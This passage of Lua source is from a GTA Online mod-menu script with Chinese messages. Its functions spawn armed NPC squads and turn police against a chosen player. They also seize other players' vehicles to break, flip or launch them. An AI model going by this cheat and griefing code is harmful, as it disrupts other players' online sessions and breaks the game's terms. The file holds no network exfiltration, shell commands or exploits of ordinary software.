			VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, 0, 0, 0) --black
			VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle, 0, 0, 0)
			VEHICLE.SET_VEHICLE_MOD_COLOR_1(vehicle, 3, 0, 0) --matte finish
			VEHICLE.SET_VEHICLE_MOD_COLOR_2(vehicle, 3, 0, 0)-- matte secondary
			VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, 11) --street wheel type
			PED.SET_PED_SUFFERS_CRITICAL_HITS(clown, false)
			VEHICLE.SET_VEHICLE_MOD(vehicle, 0, 3) --spoiler
			VEHICLE.SET_VEHICLE_MOD(vehicle, 23, 0)--wheel type?
			VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, 0, 0) --wheel color
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(vehicle, 4) --plate type, 4 is SA EXEMPT which law enforcement and government vehicles use
			if godmodeatk then
				ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			end
			if pcar then 
				PED.SET_PED_COMBAT_ATTRIBUTES(clown, 3, false)
			end
			if d then
				PED.SET_AI_WEAPON_DAMAGE_MODIFIER(clown, 3000000)
			end
            if i == -1 then
                TASK.TASK_VEHICLE_CHASE(clown, player_ped)
				WEAPON.GIVE_WEAPON_TO_PED(clown, 584646201 , 1000, false, true)
            else
                WEAPON.GIVE_WEAPON_TO_PED(clown, 4208062921, 9999, false, true)
				WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(clown, 4208062921, 0x8B3C480B)
				WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(clown, 4208062921, 0x4DB62ABE)
				WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(clown, 4208062921, 0x5DD5DBD5)
				WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(clown, 4208062921, 0x9D65907A)
				WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(clown, 4208062921, 0x420FD713)
				PED.SET_PED_FIRING_PATTERN(clown, -957453492)
            end
        end
    end
function getOffsetFromEntityGivenDistance(entity, distance)
	local pos = ENTITY.GET_ENTITY_COORDS(entity, 0)
	local theta = (math.random() + math.random(0, 1)) * math.pi --returns a random angle between 0 and 2pi (exclusive)
	local coords = vect.new(
		pos.x + distance * math.cos(theta),
		pos.y + distance * math.sin(theta),
		pos.z
	)
	return coords
end
function paiqianfib(on_click)
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vehicleHash = util.joaat("krieger")
		local pedHash = 1558115333 
		requestModels(vehicleHash, pedHash)
		local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(targetPed)
		local vehicle = entities.create_vehicle(vehicleHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
		if not ENTITY.DOES_ENTITY_EXIST(vehicle) then
			return
		end

		local offset = getOffsetFromEntityGivenDistance(vehicle, 50.0)
		local outCoords = v3.new()
		local outHeading = memory.alloc()

		if PATHFIND.GET_CLOSEST_VEHICLE_NODE_WITH_HEADING(offset.x, offset.y, offset.z, outCoords, outHeading, 1, 3.0, 0) then
			ENTITY.SET_ENTITY_COORDS(vehicle, v3.getX(outCoords), v3.getY(outCoords), v3.getZ(outCoords))
			ENTITY.SET_ENTITY_HEADING(vehicle, memory.read_float(outHeading))
			VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, true)
		end
        for i=-1, VEHICLE.GET_VEHICLE_MAX_NUMBER_OF_PASSENGERS(vehicle) - 1 do
            local clown = entities.create_ped(2, pedHash, outCoords, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
            PED.SET_PED_INTO_VEHICLE(clown, vehicle, i)
            if i % 2 == 0 then
				WEAPON.GIVE_WEAPON_TO_PED(clown, 584646201 , 9999, false, true)
				PED.SET_PED_FIRING_PATTERN(clown, -957453492)
            else
				WEAPON.GIVE_WEAPON_TO_PED(clown, 584646201 , 9999, false, true)
				PED.SET_PED_FIRING_PATTERN(clown, -957453492)
            end
			PED.SET_PED_AS_COP(clown, true)
			addBlipForEntity(vehicle, 672, 40)
			PED.SET_PED_CONFIG_FLAG(clown, 281, true)
			PED.SET_PED_CONFIG_FLAG(clown, 2, true)
			PED.SET_PED_CONFIG_FLAG(clown, 33, false)
            PED.SET_PED_COMBAT_ATTRIBUTES(clown, 5, true)
            PED.SET_PED_COMBAT_ATTRIBUTES(clown, 46, true)
			PED.SET_PED_ACCURACY(clown, 100.0)
			PED.SET_PED_HEARING_RANGE(clown, 99999)
			PED.SET_PED_RANDOM_COMPONENT_VARIATION(clown, 0)
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 3)
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "FIB")
			VEHICLE.SET_VEHICLE_EXPLODES_ON_HIGH_EXPLOSION_DAMAGE(vehicle, false)
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 50)
			PED.SET_PED_MAX_HEALTH(clown, 150)
			ENTITY.SET_ENTITY_PROOFS(ped, false, true, false, false, true, false, false, false)
			ENTITY.SET_ENTITY_HEALTH(clown, 150)
			PED.SET_PED_ARMOUR(clown, 100)
			PED.SET_PED_SHOOT_RATE(clown, 5)
			VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
			VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, 0, 0, 0) --black
			VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle, 0, 0, 0)
			VEHICLE.SET_VEHICLE_MOD_COLOR_1(vehicle, 3, 0, 0) --matte finish
			VEHICLE.SET_VEHICLE_MOD_COLOR_2(vehicle, 3, 0, 0)-- matte secondary
			VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, 11) --street wheel type
			PED.SET_PED_SUFFERS_CRITICAL_HITS(clown, false)
			VEHICLE.SET_VEHICLE_MOD(vehicle, 0, 3) --spoiler
			VEHICLE.SET_VEHICLE_MOD(vehicle, 23, 0)--wheel type?
			VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, 0, 0) --wheel color
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(vehicle, 4) --plate type, 4 is SA EXEMPT which law enforcement and government vehicles use
			if godmodeatk then
				ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			end
			if pcar then 
				PED.SET_PED_COMBAT_ATTRIBUTES(clown, 3, false)
			end
			if d then
				PED.SET_AI_WEAPON_DAMAGE_MODIFIER(clown, 3000000)
			end
            if i == -1 then
                TASK.TASK_VEHICLE_CHASE(clown, player_ped)
				WEAPON.GIVE_WEAPON_TO_PED(clown, 584646201 , 1000, false, true)
            else
                TASK.TASK_COMBAT_PED(clown, player_ped, 0, 16)
				WEAPON.GIVE_WEAPON_TO_PED(clown, 4208062921, 9999, false, true)
				WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(clown, 4208062921, 0x8B3C480B)
				WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(clown, 4208062921, 0x4DB62ABE)
				WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(clown, 4208062921, 0x5DD5DBD5)
				WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(clown, 4208062921, 0x9D65907A)
				WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(clown, 4208062921, 0x420FD713)
				PED.SET_PED_FIRING_PATTERN(clown, -957453492)
            end
        end
    end
    function paiqianfibdimiandanwei(on_click)
        local pedHash = 1558115333 
		requestModels(pedHash)
		local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local offset = getOffsetFromEntityGivenDistance(targetPed, 40.0)
		local pos = ENTITY.GET_ENTITY_COORDS(targetPed)
		local outCoords = v3.new()
		local outHeading = memory.alloc()
		local pod = entities.create_ped(28, pedHash, pos, 30.0)

		if PATHFIND.GET_CLOSEST_VEHICLE_NODE_WITH_HEADING(offset.x, offset.y, offset.z, outCoords, outHeading, 1, 3.0, 0) then
			ENTITY.SET_ENTITY_COORDS(pod, v3.getX(outCoords), v3.getY(outCoords), v3.getZ(outCoords))
			ENTITY.SET_ENTITY_HEADING(pod, memory.read_float(outHeading))
		end
		WEAPON.GIVE_WEAPON_TO_PED(pod, 4208062921, 9999, false, true)
		WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(pod, 4208062921, 0x8B3C480B)
		WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(pod, 4208062921, 0x4DB62ABE)
		WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(pod, 4208062921, 0x5DD5DBD5)
		WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(pod, 4208062921, 0x9D65907A)
		WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(pod, 4208062921, 0x420FD713)
		PED.SET_PED_FIRING_PATTERN(pod, -957453492)
		PED.SET_PED_AS_COP(pod, true)
		smolblip(pod, 3, 0)
		PED.SET_PED_CONFIG_FLAG(pod, 281, true)
		PED.SET_PED_CONFIG_FLAG(pod, 2, true)
		PED.SET_PED_CONFIG_FLAG(pod, 33, false)
		PED.SET_PED_COMBAT_ATTRIBUTES(pod, 5, true)
		PED.SET_PED_COMBAT_ATTRIBUTES(pod, 46, true)
		PED.SET_PED_ACCURACY(pod, 100.0)
		PED.SET_PED_HEARING_RANGE(pod, 99999)
		PED.SET_PED_RANDOM_COMPONENT_VARIATION(pod, 0)
		PED.SET_PED_SUFFERS_CRITICAL_HITS(pod, false)
		PED.SET_PED_MAX_HEALTH(pod, 150)
		ENTITY.SET_ENTITY_PROOFS(ped, false, true, false, false, true, false, false, false)
		ENTITY.SET_ENTITY_HEALTH(pod, 150)
		PED.SET_PED_ARMOUR(pod, 100)
		PED.SET_PED_SHOOT_RATE(pod, 5)
		TASK.TASK_COMBAT_PED(pod, targetPed, 0, 16)
		if gutask then
			PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(pod, true)
		end
		
		
	end

    function baituobudiao(on)
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid) -- gets the player 
		local pos = ENTITY.GET_ENTITY_COORDS(player_ped) -- gets the players coords, defines it as "pos"
		for _, ped in ipairs(GET_NEARBY_PEDS(pid, 2500)) do -- executes everything under this line for all peds this many units from the player
		local pt = PED.GET_PED_TYPE(ped) -- gets the types of peds in this area
			if not PED.IS_PED_A_PLAYER(ped) then  -- if the ped is not a player, execute everything under this line
				if pt == 6 or pt == 27 then -- if the ped type is 6 or 27, execute everything under this line. 6 is police, 27 is swat
					REQUEST_CONTROL_LOOP(ped) -- requests control
					TASK.TASK_COMBAT_PED(ped, player_ped, 0, 0) --makes them fight the target
				end
			end
		wait(30)
		end
	end
    function tezhongtiaozi(on)
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
		for _, ped in ipairs(GET_NEARBY_PEDS(pid, 250)) do
		local pt = PED.GET_PED_TYPE(ped)
			if not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_HURT(ped) then
				if pt == 6 or pt == 27 then -- 6 is police, 27 is swat
					REQUEST_CONTROL_LOOP(ped)
					PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)
					PED.SET_PED_COMBAT_ATTRIBUTES(ped, 2, true)
					PED.SET_PED_FLEE_ATTRIBUTES(ped, 512, false)
					PED.SET_PED_SUFFERS_CRITICAL_HITS(ped, false)
					WEAPON.GIVE_WEAPON_TO_PED(ped, 4208062921, 9999, false, true)
					WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(ped, 4208062921, 0x8B3C480B)
					WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(ped, 4208062921, 0x4DB62ABE)
					WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(ped, 4208062921, 0x5DD5DBD5)
					WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(ped, 4208062921, 0x9D65907A)
					WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(ped, 4208062921, 0x420FD713)
					WEAPON.SET_PED_DROPS_WEAPONS_WHEN_DEAD(ped, false)
					PED.SET_PED_SHOOT_RATE(ped, 10)
					ENTITY.SET_ENTITY_PROOFS(ped, false, true, false, false, true, false, false, false)
					WEAPON.SET_PED_INFINITE_AMMO_CLIP(ped, true)
					ENTITY.SET_ENTITY_HEALTH(ped, 150)
					PED.SET_PED_MAX_HEALTH(ped, 150)
					PED.SET_PED_CONFIG_FLAG(ped, 281, true)
					PED.SET_PED_CONFIG_FLAG(ped, 2, true)
					PED.SET_PED_CONFIG_FLAG(ped, 33, false)
					PED.SET_PED_COMBAT_ATTRIBUTES(ped, 5, true)
					PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)
					PED.SET_PED_ARMOUR(ped, 100)
					if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
						local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
						VEHICLE.MODIFY_VEHICLE_TOP_SPEED(veh, 80)
						VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(veh, true)
						VEHICLE.SET_VEHICLE_DOORS_LOCKED(veh,-1, 3)
						WEAPON.GIVE_WEAPON_TO_PED(ped, 584646201 , 9999, false, true)
						PED.SET_PED_FIRING_PATTERN(ped, -957453492)
					else
						WEAPON.GIVE_WEAPON_TO_PED(ped, 4208062921, 9999, false, true)
						WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(ped, 4208062921, 0x8B3C480B)
						WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(ped, 4208062921, 0x4DB62ABE)
						WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(ped, 4208062921, 0x5DD5DBD5)
						WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(ped, 4208062921, 0x9D65907A)
						WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(ped, 4208062921, 0x420FD713)
						PED.SET_PED_FIRING_PATTERN(ped, -957453492)
					end
					wait(100)
				end
			end
		end
	end
    function zhixingcheli(on_click)
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid) 
		local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
		for _, ped in ipairs(GET_NEARBY_PEDS(pid, 2500)) do
		local pt = PED.GET_PED_TYPE(ped)
			if not PED.IS_PED_A_PLAYER(ped) then  
				if pt == 6 or pt == 27 then -- 
					entities.delete_by_handle(ped)
				end
			end
		end
	end
    
    function remote_car_jump(pid)
        local player_ped = PLAYER.GET_PLAYER_PED(pid)
        local player_vehicle = get_vehicle_ped_is_in(player_ped, false)
        if AUDIO.IS_HORN_ACTIVE(player_vehicle) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_vehicle)
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(player_vehicle, 1, 0.0, 0.0, 0.7, true, true, true, true) -- alternatively, VEHICLE.SET_VEHICLE_FORWARD_SPEED(...) -- not tested
        end
    end
    function toggle_player_vehicle_engine(pid)
        local player_ped = PLAYER.GET_PLAYER_PED(pid)
        local player_vehicle = get_vehicle_ped_is_in(player_ped, include_last_vehicle_for_player_functions)
        if player_vehicle == 0 then
            util.toast(players.get_name(pid) .. " 不在车中.")
        else
            local is_running = VEHICLE.GET_IS_VEHICLE_ENGINE_RUNNING(player_vehicle)
            if request_control(player_vehicle) then
                VEHICLE.SET_VEHICLE_ENGINE_ON(player_vehicle, not is_running, true, true)
                announce(players.get_name(pid) .. "'发动机已切换!")
            else
                util.toast("无法控制车辆.")
            end
        end
    end
    function lbqwy()
        local is_performing_action = PED.IS_PED_PERFORMING_MELEE_ACTION(PLAYER.PLAYER_PED_ID())
        if is_performing_action then
            menu.trigger_commands("godmode on")
            menu.trigger_commands("grace on")
            local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 29, 25.0, false, true, 0.0, true)
            AUDIO.PLAY_SOUND_FRONTEND(-1, "EMP_Blast", "DLC_HEISTS_BIOLAB_FINALE_SOUNDS", false)
        else
            menu.trigger_commands("godmode off")
        end
    end
    function break_player_vehicle_engine(pid)
        local player_ped = PLAYER.GET_PLAYER_PED(pid)
        local player_vehicle = get_vehicle_ped_is_in(player_ped, include_last_vehicle_for_player_functions)
        if player_vehicle == 0 then
            util.toast(players.get_name(pid) .. " 不在车子里.")
        else
            if request_control(player_vehicle) then
                VEHICLE.SET_VEHICLE_ENGINE_HEALTH(player_vehicle, -10.0)
                announce(players.get_name(pid) .. "这吊毛引擎坏了!")
            else
                util.toast("无法控制他们的车辆")
            end
        end
    end
    function boost_player_vehicle_forward(pid)
        local player_ped = PLAYER.GET_PLAYER_PED(pid)
        local player_vehicle = get_vehicle_ped_is_in(player_ped, include_last_vehicle_for_player_functions)
        if player_vehicle == 0 then
            util.toast(players.get_name(pid) .. " 不在车中.")
        else
            request_control(player_vehicle)
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(player_vehicle, 1, 0.0, 1000.0, 0.0, true, true, true, true)
            announce(players.get_name(pid) .. "'车辆猛冲.")
        end
    end
    
    function stop_player_vehicle(pid)
        local player_ped = PLAYER.GET_PLAYER_PED(pid)
        local player_vehicle = get_vehicle_ped_is_in(player_ped, include_last_vehicle_for_player_functions)
        if player_vehicle == 0 then
            util.toast(players.get_name(pid) .. " 不在车中.")
        else
            request_control(player_vehicle)
            VEHICLE.BRING_VEHICLE_TO_HALT(player_vehicle, 0.0, 1, false)
            announce(players.get_name(pid) .. "'s 车辆停止.")
        end
    end
    
    function flip_player_vehicle(pid)
        local player_ped = PLAYER.GET_PLAYER_PED(pid)
        local player_vehicle = get_vehicle_ped_is_in(player_ped, include_last_vehicle_for_player_functions)
        if player_vehicle == 0 then
            util.toast(players.get_name(pid) .. " 不在车中.")
        else
            request_control(player_vehicle)
            local heading = ENTITY.GET_ENTITY_HEADING(player_vehicle)
            ENTITY.SET_ENTITY_ROTATION(player_vehicle, 0, 180, -heading, 1, true)
            announce(players.get_name(pid) .. "'s 车辆翻转.")
        end
    end
    
    function turn_player_vehicle(pid)
        local player_ped = PLAYER.GET_PLAYER_PED(pid)
        local player_vehicle = get_vehicle_ped_is_in(player_ped, include_last_vehicle_for_player_functions)
        if player_vehicle == 0 then
            util.toast(players.get_name(pid) .. " 不在任何车辆中.")
        else
            request_control(player_vehicle)
            local heading = ENTITY.GET_ENTITY_HEADING(player_vehicle)
            local alter_heading = heading >= 180 and heading-180 or heading+180
            ENTITY.SET_ENTITY_ROTATION(player_vehicle, 0, 0, alter_heading, 2, true)
            announce(players.get_name(pid) .. "'s 车辆转弯.")
        end
    end
    function request_control(entity, timeout)
        local end_time = os.time() + (timeout or 5)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and end_time >= os.time() do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
            util.yield()
        end
        return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity)
    end
    function repair_player_vehicle(pid)
        local player_ped = PLAYER.GET_PLAYER_PED(pid)
        local player_vehicle = get_vehicle_ped_is_in(player_ped, include_last_vehicle_for_player_functions)
        if player_vehicle == 0 then
            util.toast(players.get_name(pid) .. " 不在车里.")
        else
            if request_control(player_vehicle) then
                VEHICLE.SET_VEHICLE_FIXED(player_vehicle)
                announce(players.get_name(pid) .. "'已修!")
            else
                util.toast("无法控制车辆.")
            end
        end
    end
    function remote_horn_boost(pid)
        local player_ped = PLAYER.GET_PLAYER_PED(pid)
        local player_vehicle = get_vehicle_ped_is_in(player_ped, false)
        if AUDIO.IS_HORN_ACTIVE(player_vehicle) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_vehicle)
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(player_vehicle, 1, 0.0, 1.0, 0.0, true, true, true, true) -- alternatively, VEHICLE.SET_VEHICLE_FORWARD_SPEED(...) -- not tested
        end
    end
    function launch_up_player_vehicle(pid)
        local player_ped = PLAYER.GET_PLAYER_PED(pid)
        local player_vehicle = get_vehicle_ped_is_in(player_ped, include_last_vehicle_for_player_functions)
        if player_vehicle == 0 then
            util.toast(players.get_name(pid) .. " 不在车中.")
        else
            if request_control(player_vehicle) then
                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(player_vehicle, 1, 0.0, 0.0, 1000.0, true, true, true, true)
                announce(players.get_name(pid) .. "'已发射.")
            else
                util.toast("无法控制车辆.")
            end
        end
    end
    function is_player_modder(pid)
        local suffix = players.is_marked_as_modder(pid) and "已触发挂壁检测." or " 尚未触发挂壁检测."
        chat.send_message(players.get_name(pid) .. suffix,
        true, -- is team chat
        true, -- is in local history
        false -- is networked
        )
    end
function requestModels(...)
	local arg = {...}
	for _, model in ipairs(arg) do
		if not STREAMING.IS_MODEL_VALID(model) then
			util.toast(model)
			error("试图请求无效的模型")
		end
		STREAMING.REQUEST_MODEL(model)
		while not STREAMING.HAS_MODEL_LOADED(model) do
			wait()
		end
	end
end
function REQUEST_CONTROL_LOOP(entity)
	local tick = 0
	while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and tick < 25 do
		wait()
		NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
		tick = tick + 1
	end
	if NETWORK.NETWORK_IS_SESSION_STARTED() then
		local netId = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
		NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
		NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, true)
	end
end
function get_vehicle_ped_is_in(ped, includeLastVehicle)
    if includeLastVehicle or PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
        return PED.GET_VEHICLE_PED_IS_IN(ped, false)
    end
    return 0
end
function gaibianchesu(string)
local input = tonumber(string)
        if type(input) == "nil" then
            util.toast("输入必须是数字。再试一次!")
        else
            local vehicle = get_vehicle_ped_is_in(players.user_ped(), include_last_vehicle_for_vehicle_functions)
            if vehicle == 0 then
                util.toast("先上车，吊毛.")
            else
                local number = tonumber(input) or 0
                VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, number)
                announce("加速度改变，试试看!")
            end
        end
    end
    local join_ing = false
function CheckLobbyForPlayers()
    local buffer = join_ing
    join_ing = NETWORK.NETWORK_IS_SESSION_STARTED()
    wait(2000)
    local playersTable = players.list()
    if buffer ~= join_ing then
        for i = 1, 100 do
            util.toast("战局中的玩家: " .. #playersTable)
            util.yield(10)
        end
    end
end
function xianshishijian(state)
    timeos = state
        if timeos then
            while timeos do
                util.yield(0)
                draw_string(string.format(os.date('~bold~~italic~~o~%Y-%m-%d ~y~%H:%M:%S', os.time())), 0.83,0.1, 0.5,5)
                end
            end 
    end
function diaoshepao(asset)
    local request_time = os.time()
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end
chosen_welcome_phrase_index = math.random(1,100) == 1 and #possible_welcome_phrases or math.random(#possible_welcome_phrases - 1)
welcome_phrase = string.format(possible_welcome_phrases[chosen_welcome_phrase_index], user_name)
if not SCRIPT_SILENT_START then util.toast("加载CqCqScript\n\n" .. welcome_phrase) end
function announce(string)
    if announce_actions then
        util.toast(string)
    end
end
function yijianxueqiu()
local plist = players.list()
    local snowballs = util.joaat('WEAPON_SNOWBALL')
    for i = 1, #plist do
        local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(plist[i])
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(plyr, snowballs, 20, true)
        WEAPON.SET_PED_AMMO(plyr, snowballs, 20)
        util.yield()
    end
    util.toast("已获得雪球 x10")
end
function yijianyanhua()
local plist = players.list()
local fireworks = util.joaat('weapon_firework')
for i = 1, #plist do
    local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(plist[i])
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(plyr, fireworks, 20, true)
    WEAPON.SET_PED_AMMO(plyr, fireworks, 20)
    util.yield()
end
util.toast("已获得烟花发射器(20发) x1")
end
function qiniu(state)
local player_heading = ENTITY.GET_ENTITY_HEADING(players.user_ped())
        local player_coords = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        if state then
            request_model(util.joaat("TRACTOR")) -- util.joaat("TRACTOR") == 1641462412 (tractor hash)
            vehicle_for_cow_rider = VEHICLE.CREATE_VEHICLE(util.joaat("TRACTOR"), player_coords.x, player_coords.y, player_coords.z, player_heading, true, true, false)
            request_model(util.joaat("A_C_Cow")) -- util.joaat("A_C_Cow") == 4244282910 (cow hash)
            ENTITY.SET_ENTITY_VISIBLE(vehicle_for_cow_rider, false, 0)
            PED.SET_PED_INTO_VEHICLE(players.user_ped(), vehicle_for_cow_rider, -1)
            cow_for_cow_rider = PED.CREATE_PED(29, 4244282910, player_coords.x, player_coords.y, player_coords.z, player_heading, true, true)
            local bone = PED.GET_PED_BONE_INDEX(cow_for_cow_rider, 0x796e)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(cow_for_cow_rider, vehicle_for_cow_rider, bone, 0, -1, 0.5, 0, 0, 0, true, false, false, false, 1, false, false)
            ENTITY.SET_ENTITY_INVINCIBLE(vehicle_for_cow_rider, true)
            set_ped_apathy(cow_for_cow_rider, true)
            if not menu.get_value(menu.ref_by_path("Self>Glued To Seats")) then
                menu.trigger_command(menu.ref_by_path("Self>Glued To Seats", 38), "on")
                altered_seatbelt_state = true
            end
        else
            if altered_seatbelt_state then
                menu.trigger_command(menu.ref_by_path("Self>Glued To Seats", 38), "off")
            end
            entities.delete_by_handle(vehicle_for_cow_rider)
            entities.delete_by_handle(cow_for_cow_rider)
        end
    end
function set_ped_apathy(ped, value)
    PED.SET_PED_CONFIG_FLAG(ped, 208, value)
    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, value)
    ENTITY.SET_ENTITY_INVINCIBLE(ped, value)
end
function xianshijiaoben(state)
    sname = state
    while sname do
        if mcxh==1 and mcg<256 then
            HUD.SET_TEXT_COLOUR(mcr, mcg, mcb, 255)	
            if mcg == 255 then
                mcxh=2
            else
                mcg=mcg+1
            end
        elseif mcxh==2 and mcr>-1 then
            HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
            if mcr == 0 then
                mcxh=3
            else
                mcr=mcr-1
            end
        elseif mcxh==3 and mcb<256 then
            HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
            if mcb == 255 then
                mcxh=4
            else
                mcb=mcb+1
            end
        elseif mcxh==4 and mcg>-1 then
            HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
            if mcg == 0 then
                mcxh=5
            else
                mcg=mcg-1
            end
        elseif mcxh==5 and mcr<256 then
            HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
            if mcr == 255 then
                mcxh=6
            else
                mcr=mcr+1
            end
        elseif mcxh==6 and mcb>-1 then
            HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
            if mcb == 0 then
                mcxh=1
            else
                mcb=mcb-1
            end
        end
    draw_string(string.format("~italic~¦~bold~帅气的CqCqscript用户: "..PLAYER.GET_PLAYER_NAME(players.user()).."&#8721;"), 0.32,0.1, 0.6,5)--======来自heezy
    util.yield()
    end
end
function request_model(hash, timeout)
    local end_time = os.time() + (timeout or 5)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) and end_time >= os.time() do
        util.yield()
    end
    return STREAMING.HAS_MODEL_LOADED(hash)
end
function play_anim(dict, name, duration)
    ped = PLAYER.PLAYER_PED_ID()
    while not STREAMING.HAS_ANIM_DICT_LOADED(dict) do
        STREAMING.REQUEST_ANIM_DICT(dict)
        util.yield()
    end
    TASK.TASK_PLAY_ANIM(ped, dict, name, 1.0, 1.0, duration, 3, 0.5, false, false, false)
    --TASK_PLAY_ANIM(Ped ped, char* animDictionary, char* animationName, float blendInSpeed, float blendOutSpeed, int duration, int flag, float playbackRate, BOOL lockX, BOOL lockY, BOOL lockZ)
end

UOL_TUBES = {
    "ar_prop_ar_tube_2x_crn",
    "ar_prop_ar_tube_2x_crn_15d",
    "ar_prop_ar_tube_2x_crn_30d",
    "ar_prop_ar_tube_2x_crn_5d",
    "ar_prop_ar_tube_2x_crn2",
    "ar_prop_ar_tube_2x_gap_02",
    "ar_prop_ar_tube_2x_l",
    "ar_prop_ar_tube_2x_m",
    "ar_prop_ar_tube_2x_s",
    "ar_prop_ar_tube_2x_speed",
    "ar_prop_ar_tube_2x_xs",
    "ar_prop_ar_tube_2x_xxs",
    "ar_prop_ar_tube_4x_crn",
    "ar_prop_ar_tube_4x_crn_15d",
    "ar_prop_ar_tube_4x_crn_30d",
    "ar_prop_ar_tube_4x_crn_5d",
    "ar_prop_ar_tube_4x_crn2",
    "ar_prop_ar_tube_4x_gap_02",
    "ar_prop_ar_tube_4x_l",
    "ar_prop_ar_tube_4x_m",
    "ar_prop_ar_tube_4x_s",
    "ar_prop_ar_tube_4x_speed",
    "ar_prop_ar_tube_4x_xs",
    "ar_prop_ar_tube_4x_xxs",
    "ar_prop_ar_tube_crn",
    "ar_prop_ar_tube_crn_15d",
    "ar_prop_ar_tube_crn_30d",
    "ar_prop_ar_tube_crn_5d",
    "ar_prop_ar_tube_crn2",
